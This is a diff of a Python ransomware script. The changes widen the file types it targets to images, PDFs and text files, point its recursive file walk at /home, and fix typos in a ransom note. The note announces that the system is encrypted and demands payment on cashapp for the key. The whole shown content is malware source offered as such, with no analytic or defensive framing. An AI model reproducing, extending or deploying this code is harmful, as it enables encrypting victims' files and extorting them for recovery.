@@ -21,11 +21,11 @@ btJqj6xc3SZpaGhFJiEnfaCSGZmWGEwufQIDAQAB
 
 
 # Defining which files to encrypt
-file_extensions = ['.jpeg']
+file_extensions = ['.jpeg', '.gif', '.pdf', '.txt', '.jpg']
 
 # Pulling path of all files in the system and checking for matching extentions
 file_paths = []
-for root, dirs, files_list, in os.walk('/'):
+for root, dirs, files_list, in os.walk('/home'):
      for file in files_list:
           file_path = os.path.join(root, file)
           file_ext = os.path.splitext(file_path)[1].lower()
@@ -66,4 +66,4 @@ with open('fernet_key', 'wb') as f:
 # Ransomnote
 print("Your system has been encrypted by the 1337 H@xors, to recover your files refer to hacked.txt")
 with open("Hacked.txt", "w") as f:
-     f.write("Your systems has beec comrpomised. To recover your data send $5 to H@x0r5 on cashapp. From there we will decrypt the key and allow you to unencrypt your data. >:)")
+     f.write("Your systems has been comrpomised. To recover your data send $5 to H@x0r5 on cashapp. From there we will decrypt the key and allow you to unencrypt your data. >:)")
